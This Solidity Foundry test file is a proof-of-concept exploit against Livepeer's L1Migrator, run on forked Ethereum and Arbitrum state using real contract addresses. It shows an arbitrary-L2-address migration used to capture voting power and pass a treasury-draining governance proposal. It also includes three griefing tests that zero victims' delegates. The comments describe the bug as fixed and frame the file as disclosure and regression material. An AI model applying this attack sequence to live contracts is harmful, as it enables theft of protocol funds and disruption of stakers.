// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import "ds-test/test.sol";
import "./interfaces/ICheatCodes.sol";
import "./interfaces/IBondingManager.sol";
import "./interfaces/IRoundManager.sol";
import "../../contracts/L2/gateway/L2Migrator.sol";

struct MigrateUnbondingLocksParams {
    address l1Addr;
    address l2Addr;
    uint256 total;
    uint256[] unbondingLockIds;
    address delegate;
}

struct MigrateDelegatorParams {
    address l1Addr;
    address l2Addr;
    uint256 stake;
    uint256 delegatedStake;
    uint256 fees;
    address delegate;
}

interface IL2Migrator {
    function l1MigratorAddr() external view returns (address);
    function controller() external view returns (address);
    function setL1Migrator(address _l1MigratorAddr) external;
    function finalizeMigrateUnbondingLocks(MigrateUnbondingLocksParams calldata) external;
    function finalizeMigrateDelegator(MigrateDelegatorParams calldata) external;
}

interface IL1Migrator {
    function unpause() external;
    function migrateUnbondingLocks(
        address _l1Addr,
        address _l2Addr,
        uint256[] calldata _unbondingLockIds,
        bytes calldata _sig,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost
    ) external payable;
    function getMigrateUnbondingLocksParams(
        address _l1Addr,
        address _l2Addr,
        uint256[] calldata _unbondingLockIds
    ) external view returns (bytes memory data, MigrateUnbondingLocksParams memory params);
    function migrateDelegator(
        address _l1Addr,
        address _l2Addr,
        bytes calldata _sig,
        uint256 _maxGas,
        uint256 _gasPriceBid,
        uint256 _maxSubmissionCost
    ) external payable;
    function getMigrateDelegatorParams(
        address _l1Addr,
        address _l2Addr
    ) external view returns (bytes memory data, MigrateDelegatorParams memory params);
    function inbox() external view returns (address);
    function bondingManagerAddr() external view returns (address);
    function ticketBrokerAddr() external view returns (address);
    function tokenAddr() external view returns (address);
    function l1LPTGatewayAddr() external view returns (address);
    function l2MigratorAddr() external view returns (address);
}

interface ILivepeerToken {
    function balanceOf(address) external view returns (uint256);
    function mint(address, uint256) external;
    function transfer(address, uint256) external;
    function approve(address, uint256) external;
}

interface ILivepeerGovernor {
    function votingDelay() external view returns (uint256);
    function votingPeriod() external view returns (uint256);
    function proposalThreshold() external view returns (uint256);
    function quorumNumerator() external view returns (uint256);
    function quorumDenominator() external view returns (uint256);
    function castVote(uint256, uint8) external returns (uint256);
    function propose(address[] memory, uint256[] memory, bytes[] memory, string memory) external returns (uint256);
    function execute(address[] memory, uint256[] memory, bytes[] memory, bytes32) external payable returns (uint256);
    function queue(address[] memory, uint256[] memory, bytes[] memory, bytes32) external payable returns (uint256);
}

interface IBondingVotes {
    function totalSupply() external view returns (uint256);
}

// PoC for the arbitrary L2 address issue in L1Migrator: a migrating L1
// transcoder could name any L2 address, then use the resulting voting power to
// pass a Treasury-draining proposal.
//
// Fixed. L1Migrator now requires _l2Addr to match _l1Addr (fb75e27), and the
// fixed contract was redeployed on 2026-06-01 with L2Migrator re-pointed to it.
//
// This file targets the ORIGINAL deployment, which has been paused since
// 2026-04-09 as the interim mitigation. That is why setUp calls
// _unpauseL1Migrator(): the attack is reproduced under its original conditions.
//
// See L1MigratorArbitraryL2AddrFix for the regression test.
//
// ETH_RPC_URL="" ARB_RPC_URL="" forge test -vvv --match-contract L1MigratorArbitraryL2AddrAttackPoC
contract L1MigratorArbitraryL2AddrPoC is L2ArbitrumMessenger, DSTest {
    ICheatCodes public constant CHEATS = ICheatCodes(HEVM_ADDRESS);

    address public constant L1_MIGRATOR_ADDRESS = 0x21146B872D3A95d2cF9afeD03eE5a783DaE9A89A;
    address public constant L1_MIGRATOR_ADMIN = 0x04746b890d090ae3c4c5dF0101CFD089A4FACA6C;
    IBondingManagerOverride public constant L1_BONDING = IBondingManagerOverride(0x511Bc4556D823Ae99630aE8de28b9B80Df90eA2e);

    IL2Migrator public constant L2_MIGRATOR = IL2Migrator(0x148D5b6B4df9530c7C76A810bd1Cdf69EC4c2085);
    IBondingManagerOverride public constant L2_BONDING = IBondingManagerOverride(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
    IRoundsManager public constant L2_ROUNDS_MANAGER = IRoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
    ILivepeerGovernor public constant L2_LIVEPEER_GOVERNOR = ILivepeerGovernor(0xcFE4E2879B786C3aa075813F0E364bb5acCb6aa0);
    IBondingVotes public constant L2_BONDING_VOTES = IBondingVotes(0x0B9C254837E72Ebe9Fe04960C43B69782E68169A);
    ILivepeerToken public constant L2_TOKEN = ILivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    address public constant LIVEPEER_MINTER = 0xc20DE37170B45774e6CD3d2304017fc962f27252;
    address public constant L2_TREASURY = 0xf82C1FF415F1fCf582554fDba790E27019c8E8C4;

    address internal VICTIM_TRANSCODER;
    address internal ATTACKER_FROM_L1POOL;
    address internal ATTACKER_RANDOM = makeAddr("ATTACKER_RANDOM");

    uint256 internal l1Fork;
    uint256 internal l2Fork;

    address[] internal whales;
    function setUp() public virtual {
        whales =[makeAddr("whale1"), makeAddr("whale2"), makeAddr("whale3"), makeAddr("whale4")];

        _createForks();

        // an ATTACKER from the L1 transcoder pool (self-delegated)
        CHEATS.selectFork(l1Fork);
        ATTACKER_FROM_L1POOL = L1_BONDING.getFirstTranscoderInPool();
        require(ATTACKER_FROM_L1POOL != address(0), "L1 transcoder pool is empty");

        // Fund the ATTACKER_FROM_L1POOL on L1
        CHEATS.deal(ATTACKER_FROM_L1POOL, 10 ether);

        // a TRANSCODER from the L2 transcoder pool (self-delegated)
        CHEATS.selectFork(l2Fork);
        VICTIM_TRANSCODER = L2_BONDING.getFirstTranscoderInPool();

        // Create 4 whales for easier demonstration instead of iterating through thousands of bonders
        uint256 totalSupply = L2_BONDING_VOTES.totalSupply();
        uint256 quorumNumerator = L2_LIVEPEER_GOVERNOR.quorumNumerator();
        uint256 quorumDenominator = L2_LIVEPEER_GOVERNOR.quorumDenominator();

        assertLt(quorumNumerator, quorumDenominator / 2);

        uint256 amount = totalSupply / 4;
        for (uint8 i = 0; i < whales.length; i ++) {
            address whale = whales[i];

            CHEATS.prank(LIVEPEER_MINTER);
            L2_TOKEN.mint(whale, amount);

            CHEATS.startPrank(whale);
            L2_TOKEN.approve(address(L2_BONDING), amount);
            L2_BONDING.bond(amount, VICTIM_TRANSCODER);
            CHEATS.stopPrank();
        }

        uint256 proposalThreshold = L2_LIVEPEER_GOVERNOR.proposalThreshold();
        CHEATS.prank(LIVEPEER_MINTER);
        L2_TOKEN.mint(ATTACKER_FROM_L1POOL, proposalThreshold);

        CHEATS.startPrank(ATTACKER_FROM_L1POOL);
        L2_TOKEN.approve(address(L2_BONDING), proposalThreshold);
        L2_BONDING.bond(proposalThreshold, ATTACKER_FROM_L1POOL);
        CHEATS.stopPrank();

        _skipToNextRound();
        L2_ROUNDS_MANAGER.initializeRound();
    }

    function test_treasuryDraining() public virtual {
        address[] memory targets = new address[](1);
        targets[0] = address(L2_TOKEN);

        uint256[] memory values = new uint256[](1);
        values[0] = uint256(0);

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("transfer(address,uint256)", ATTACKER_FROM_L1POOL, L2_TOKEN.balanceOf(L2_TREASURY));

        string memory description = "";

        CHEATS.prank(ATTACKER_FROM_L1POOL);
        uint256 proposalId = L2_LIVEPEER_GOVERNOR.propose(targets, values, calldatas, description);

        uint256 votingDelay = L2_LIVEPEER_GOVERNOR.votingDelay();
        uint256 votingPeriod = L2_LIVEPEER_GOVERNOR.votingPeriod();

        for (uint256 i = 0; i < votingDelay; i ++) {
            _skipToNextRound();
            L2_ROUNDS_MANAGER.initializeRound();
        }

        _unpauseL1Migrator();
        MigrateUnbondingLocksParams[] memory whaleParams = new MigrateUnbondingLocksParams[](whales.length);
        for (uint256 i = 0; i < whales.length; i++) {
            whaleParams[i] = _initiateL1UnbondingLocksMigration(ATTACKER_FROM_L1POOL, whales[i], _ids(i));
        }

        CHEATS.selectFork(l2Fork);
        CHEATS.startPrank(applyL1ToL2Alias(L1_MIGRATOR_ADDRESS));
        for (uint256 i = 0; i < whales.length; i++) {
            L2_MIGRATOR.finalizeMigrateUnbondingLocks(whaleParams[i]);
        }
        CHEATS.stopPrank();

        _skipToNextRound();
        L2_ROUNDS_MANAGER.initializeRound();

        CHEATS.prank(ATTACKER_FROM_L1POOL);
        L2_LIVEPEER_GOVERNOR.castVote(proposalId, 1);

        for (uint256 i = 0; i < votingPeriod; i ++) {
            _skipToNextRound();
            L2_ROUNDS_MANAGER.initializeRound();
        }

        CHEATS.startPrank(ATTACKER_FROM_L1POOL);
        L2_LIVEPEER_GOVERNOR.queue(targets, values, calldatas, keccak256(bytes(description)));
        L2_LIVEPEER_GOVERNOR.execute(targets, values, calldatas, keccak256(bytes(description)));
        CHEATS.stopPrank();

        uint256 treasuryBalance = L2_TOKEN.balanceOf(L2_TREASURY);
        assertEq(treasuryBalance, 0, "Treasury not drained!");

        emit log_named_uint("Treasury balance:", treasuryBalance);
        emit log_named_uint("ATTACKER_FROM_L1POOL balance:", L2_TOKEN.balanceOf(ATTACKER_FROM_L1POOL));
    }



    // Proves that an EMPTY unbonding lock array is also accepted by the deployed L1Migrator
    // A random ATTACKER with NO L1 delegation (delegate = address(0) on L1) can zero
    // any victim's delegate in one cheap transaction, no stake, no lock history required
    function test_griefing_via_emptyUnbondingLocks() public virtual {
        address victim = whales[0];

        // Verify the ATTACKER_RANDOM has no L1 delegation before initiating
        CHEATS.selectFork(l1Fork);
        (,, address ATTACKER_RANDOML1Delegate,,,,) = L1_BONDING.getDelegator(ATTACKER_RANDOM);
        assertEq(ATTACKER_RANDOML1Delegate, address(0), "ATTACKER_RANDOM must have no L1 delegation for this test");

        _unpauseL1Migrator();
        uint256[] memory emptyLocks = new uint256[](0);
        MigrateUnbondingLocksParams memory griefParams = _initiateL1UnbondingLocksMigration(ATTACKER_RANDOM, victim, emptyLocks);
        assertEq(griefParams.delegate, address(0), "Encoded delegate must be address(0) for this attack");

        CHEATS.selectFork(l2Fork);
        _skipToNextRound();
        L2_ROUNDS_MANAGER.initializeRound();

        (,, address delegateBefore,,,,) = L2_BONDING.getDelegator(victim);
        assertTrue(delegateBefore != address(0), "Victim should have a non-zero delegate initially");
        assertEq(delegateBefore, VICTIM_TRANSCODER, "Victim should be delegated to the TRANSCODER");
        emit log_named_address("Victim delegate BEFORE attack", delegateBefore);

        // bondFor(0, victim, address(0)) zeroes the victim's delegate
        CHEATS.startPrank(applyL1ToL2Alias(L1_MIGRATOR_ADDRESS));
        L2_MIGRATOR.finalizeMigrateUnbondingLocks(griefParams);
        CHEATS.stopPrank();

        (,, address delegateAfter,,,,) = L2_BONDING.getDelegator(victim);
        emit log_named_address("Victim delegate AFTER attack", delegateAfter);
        assertEq(delegateAfter, address(0), "CONFIRMED: victim's delegate zeroed with empty lock array");
    }

    // Proves that a fake/non-existent lock array is also accepted by the deployed L1Migrator
    // A random ATTACKER with NO L1 delegation (delegate = address(0) on L1) can zero
    // any victim's delegate in one cheap transaction, no stake, no lock history required
    function test_griefing_via_fakeUnbondingLocks() public virtual {
        address victim = whales[0];

        // Verify the ATTACKER_RANDOM has no L1 delegation before initiating
        CHEATS.selectFork(l1Fork);
        (,, address ATTACKER_RANDOML1Delegate,,,,) = L1_BONDING.getDelegator(ATTACKER_RANDOM);
        assertEq(ATTACKER_RANDOML1Delegate, address(0), "ATTACKER_RANDOM must have no L1 delegation for this test");

        _unpauseL1Migrator();
        MigrateUnbondingLocksParams memory griefParams = _initiateL1UnbondingLocksMigration(ATTACKER_RANDOM, victim, _ids(999));
        assertEq(griefParams.delegate, address(0), "Encoded delegate must be address(0) for this attack");

        CHEATS.selectFork(l2Fork);
        _skipToNextRound();
        L2_ROUNDS_MANAGER.initializeRound();

        (,, address delegateBefore,,,,) = L2_BONDING.getDelegator(victim);
        assertTrue(delegateBefore != address(0), "Victim should have a non-zero delegate initially");
        assertEq(delegateBefore, VICTIM_TRANSCODER, "Victim should be delegated to the TRANSCODER");
        emit log_named_address("Victim delegate BEFORE attack", delegateBefore);

        // bondFor(0, victim, address(0)) zeroes the victim's delegate
        CHEATS.startPrank(applyL1ToL2Alias(L1_MIGRATOR_ADDRESS));
        L2_MIGRATOR.finalizeMigrateUnbondingLocks(griefParams);
        CHEATS.stopPrank();

        (,, address delegateAfter,,,,) = L2_BONDING.getDelegator(victim);
        emit log_named_address("Victim delegate AFTER attack", delegateAfter);
        assertEq(delegateAfter, address(0), "CONFIRMED: victim's delegate zeroed with fake lock id");
    }

    // Proves that migrateDelegator shares the same _l2Addr gap.
    // A random ATTACKER with no L1 stake or delegation can zero any victim's delegate in a single tx
    function test_griefing_via_migrateDelegator() public virtual {
        address victim = whales[0];

        // verify the ATTACKER_RANDOM has no L1 delegation before initiating
        CHEATS.selectFork(l1Fork);
        (,, address ATTACKER_RANDOML1Delegate,,,,) = L1_BONDING.getDelegator(ATTACKER_RANDOM);
        assertEq(ATTACKER_RANDOML1Delegate, address(0), "ATTACKER_RANDOM must have no L1 delegation for this test");

        _unpauseL1Migrator();

        IL1Migrator l1Migrator = IL1Migrator(L1_MIGRATOR_ADDRESS);
        CHEATS.deal(ATTACKER_RANDOM, 1 ether);
        CHEATS.prank(ATTACKER_RANDOM);
        l1Migrator.migrateDelegator{value: 1 ether}(
            ATTACKER_RANDOM,
            victim,
            new bytes(0),
            500_000,
            1_000_000_000,
            0.1 ether
        );

        (, MigrateDelegatorParams memory griefParams) = l1Migrator.getMigrateDelegatorParams(ATTACKER_RANDOM, victim);
        assertEq(griefParams.delegate, address(0), "Encoded delegate must be address(0) for this attack");

        CHEATS.selectFork(l2Fork);
        _skipToNextRound();
        L2_ROUNDS_MANAGER.initializeRound();

        (,, address delegateBefore,,,,) = L2_BONDING.getDelegator(victim);
        assertTrue(delegateBefore != address(0), "Victim should have a non-zero delegate initially");
        assertEq(delegateBefore, VICTIM_TRANSCODER, "Victim should be delegated to the TRANSCODER");
        emit log_named_address("Victim delegate BEFORE attack", delegateBefore);

        // bondFor(0, victim, address(0)) zeroes the victim's delegate
        CHEATS.startPrank(applyL1ToL2Alias(L1_MIGRATOR_ADDRESS));
        L2_MIGRATOR.finalizeMigrateDelegator(griefParams);
        CHEATS.stopPrank();

        (,, address delegateAfter,,,,) = L2_BONDING.getDelegator(victim);
        emit log_named_address("Victim delegate AFTER attack", delegateAfter);
        assertEq(delegateAfter, address(0), "CONFIRMED: victim's delegate zeroed via migrateDelegator");
    }

    function _createForks() internal virtual {
        l1Fork = CHEATS.createFork(CHEATS.envString("ETH_RPC_URL"));
        l2Fork = CHEATS.createFork(CHEATS.envString("ARB_RPC_URL"));
    }

    function _unpauseL1Migrator() internal {
        CHEATS.selectFork(l1Fork);
        CHEATS.prank(L1_MIGRATOR_ADMIN);
        IL1Migrator(L1_MIGRATOR_ADDRESS).unpause();
    }

    // Submit a migration on L1 and return the params encoded into the retryable ticket.
    // Caller must have already called _unpauseL1Migrator() before calling this function
    function _initiateL1UnbondingLocksMigration(
        address l1Addr,
        address l2Addr,
        uint256[] memory lockIds
    ) internal returns (MigrateUnbondingLocksParams memory params) {
        CHEATS.selectFork(l1Fork);
        IL1Migrator l1Migrator = IL1Migrator(L1_MIGRATOR_ADDRESS);

        CHEATS.deal(l1Addr, 1 ether);
        CHEATS.prank(l1Addr);
        l1Migrator.migrateUnbondingLocks{value: 1 ether}(
            l1Addr,
            l2Addr,
            lockIds,
            new bytes(0),
            500_000,
            1_000_000_000,
            0.1 ether
        );

        (, params) = l1Migrator.getMigrateUnbondingLocksParams(l1Addr, l2Addr, lockIds);
    }

    function _ids(uint256 id) internal pure returns (uint256[] memory ids) {
        ids = new uint256[](1);
        ids[0] = id;
    }

    function _skipToNextRound() internal {
        uint256 lastRoundLengthUpdateRound = L2_ROUNDS_MANAGER.lastRoundLengthUpdateRound();
        uint256 lastRoundLengthUpdateStartBlock = L2_ROUNDS_MANAGER.lastRoundLengthUpdateStartBlock();
        uint256 roundLength = L2_ROUNDS_MANAGER.roundLength();
        uint256 currentRound = L2_ROUNDS_MANAGER.currentRound();

        uint256 rounds = currentRound + 1 - lastRoundLengthUpdateRound;
        uint256 nextBlockNum = rounds * roundLength + lastRoundLengthUpdateStartBlock;

        CHEATS.roll(nextBlockNum);
    }

    function makeAddr(string memory name) internal pure returns (address) {
        return address(uint160(uint256(keccak256(bytes(name)))));
    }
}
